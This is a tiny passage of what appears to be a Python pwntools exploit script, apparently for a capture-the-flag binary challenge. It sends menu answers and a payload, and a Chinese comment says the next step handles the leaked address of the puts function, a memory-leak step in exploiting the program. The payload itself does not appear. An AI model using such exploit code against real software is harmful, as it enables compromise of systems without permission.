...
# p.sendlineafter(b"Before we start, please enter your character's name:", b"name")
# p.sendlineafter(b"Choose 1, 2, 3, or 4: ", b"2")
# p.sendlineafter(b"Choose 1, 2, 3, or 4: ", payload1)
p.sendline(payload1)
# 接收并处理泄露的 puts 函数地址
